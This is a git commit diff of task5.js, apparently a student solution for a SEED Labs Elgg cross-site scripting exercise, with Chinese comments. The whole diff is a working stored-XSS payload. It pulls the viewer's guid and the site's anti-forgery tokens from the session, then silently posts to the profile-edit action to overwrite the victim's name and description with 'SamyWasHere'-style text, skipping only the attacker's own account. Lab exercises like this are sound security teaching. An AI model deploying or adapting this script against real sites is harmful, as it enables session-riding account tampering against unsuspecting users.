3a3a6a89a60c5a82925697f4de76898b76d1b9b0
HakureiPOI <114349635+HakureiPOI@users.noreply.github.com>
2025-04-16 11:55:56 +0800

    Update task5.js

--- task5.js
+++ task5.js
@@ -1,28 +1,29 @@
 <script type="text/javascript">
-window.onload = function(){
-    // 获取 user name, user guid, Time Stamp __elgg_ts, 和 Security Token __elgg_token
-    var userName = elgg.session.user.name;
+window.onload = function() {
+    // 获取必要参数
+    var name = "name=" + elgg.session.user.name;
     var guid = "guid=" + elgg.session.user.guid;
-    var ts = "__elgg_ts=" + elgg.security.token.__elgg_ts;
-    var token = "__elgg_token=" + elgg.security.token.__elgg_token;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
-    // 构造请求参数
-    var description = "XSS Attack";  // 新描述内容
+    // 构造要注入的内容（payload）
+    var content = token + ts 
+                + "&name=SamyWasHere" 
+                + "&description=HackedBySamy"
+                + "&briefdescription=YouGotOwned"
+                + "&accesslevel[description]=2";
 
-    // 构造POST内容
-    var content = guid + "&" + ts + "&" + token + "&" + "description=" + encodeURIComponent(description);
-
-    var samyGuid = "59";  // samyGuid
-    var sendUrl = "http://www.seed-server.com/action/profile/edit";  // 需要发送请求的URL
+    // 不要攻击 Samy 自己
+    var samyGuid = "59";
+    var sendurl = "http://www.seed-server.com/action/profile/edit";
 
     if (elgg.session.user.guid != samyGuid) {
-        // 创建并发送AJAX请求，以修改个人资料
-        var Ajax = new XMLHttpRequest();
-        Ajax.open("POST", sendUrl, true);
+        // 创建并发送 Ajax 请求
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        
-        // 发送POST请求，包含表单数据
         Ajax.send(content);
     }
-}
+};
 </script>
